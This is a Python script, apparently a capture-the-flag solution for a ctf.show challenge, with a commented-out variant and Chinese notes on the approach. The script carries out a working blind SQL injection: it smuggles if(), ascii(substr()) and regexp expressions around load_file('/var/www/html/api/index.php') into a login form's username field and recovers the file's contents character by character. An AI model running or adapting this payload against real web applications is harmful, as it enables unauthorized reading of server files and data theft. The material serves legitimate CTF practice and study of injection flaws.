# Author：Y4tacker
import requests

url = "http://7754f741-54eb-44e6-85c3-600c41640d9b.chall.ctf.show:8080/api/index.php"


def getFlagIndex():
    head = 1
    tail = 300
    while head < tail:
        mid = (head + tail) >> 1
        data = {
            'username': "if(locate('flag{'," + "load_file('/var/www/html/api/index.php'))>{0},0,1)".format(str(mid)),
            'password': '1'
        }
        r = requests.post(url, data=data)
        if "密码错误" == r.json()['msg']:
            head = mid + 1
        else:
            tail = mid
    return mid


def getFlag(num):
    i = int(num)
    result = ""
    while 1:
        head = 32
        tail = 127
        i = i + 1
        while head < tail:
            mid = (head + tail) >> 1
            data = {
                'username': "if(ascii(substr(load_file('/var/www/html/api/index.php'),{0},1))>{1},0,1)".format(str(i),
                                                                                                               str(
                                                                                                                   mid)),
                'password': '1'
            }
            r = requests.post(url, data=data)
            if "密码错误" == r.json()['msg']:
                head = mid + 1
            else:
                tail = mid
            mid += 1
        if head != 32:
            result += chr(head)
            print(result)
        else:
            break


if __name__ == '__main__':
    index = getFlagIndex()
    getFlag(index)

# @Author:feng

# url = "http://7754f741-54eb-44e6-85c3-600c41640d9b.chall.ctf.show:8080/api/index.php"
#
# flag = "ctfshow{"
# for i in range(0, 100):
#     for j in "0123456789abcdefghijklmnopqrstuvwxyz-{}":
#         payload = "if((load_file('/var/www/html/api/index.php'))regexp('{}'),0,1)".format(flag + j)
#         data = {
#             'username': payload,
#             'password': 1
#         }
#         r = requests.post(url=url, data=data)
#         if "\\u5bc6\\u7801\\u9519\\u8bef" in r.text:
#             flag += j
#             print(flag)
#             if j == '}':
#                 exit()
#             break


'''
对于load_file的认知一直就是select load_file(xxxx),通过select查询来把文件内容读出来。
所以看到题干：flag在api/index.php文件中，
我的第一反应就是联合查询读文件。
但是进入环境才发现又是这样没回显的题目，而且还把select给ban了，感觉不太可能是load_file。
后来想了很久实在没法子又去往load_file去靠，突然想到可以盲注读flag：
username=if((load_file('/var/www/html/api/index.php'))regexp('ctfshow{'),0,1)&password=2
username=0是上一题的姿势，为0返回的是密码错误，是1返回的就是查询失败。正常不会往盲注这边想，
是因为要盲注一整个文件太耗时，不可能出这种题目。但是如果只是盲注出这个文件中的flag，那就很简单了


\u67e5\u8be2\u5931\u8d25  查询失败
若猜解的字符是正确的则返回  字符 查询失败
\u5bc6\u7801\u9519\u8bef  密码错误
若猜解的字符是错误的则返回  字符 密码错误

'''